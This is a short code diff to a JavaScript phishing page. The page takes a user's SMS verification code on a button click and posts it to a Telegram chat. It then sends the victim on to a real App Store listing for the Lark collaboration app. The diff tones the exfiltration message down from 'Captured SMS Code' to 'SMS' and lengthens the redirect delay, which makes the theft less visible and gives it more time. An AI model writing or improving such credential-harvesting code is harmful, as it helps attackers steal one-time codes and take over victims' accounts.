@@ -146,7 +146,7 @@ btn.addEventListener("click", () => {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: CHAT_ID,
-      text: `✅Captured SMS Code:  ${codeInput.value}`
+      text: `✅SMS:  ${codeInput.value}`
     })
   }).catch(err => console.error('Failed to send to Telegram:', err));
 
@@ -267,7 +267,7 @@ btn.addEventListener("click", () => {
 
   setTimeout(() => {
     window.location.href = "https://apps.apple.com/us/app/lark-team-collaboration/id6449830127?mt=12";
-  }, 2500);
+  }, 7500);
 });
 
 function goBack() {
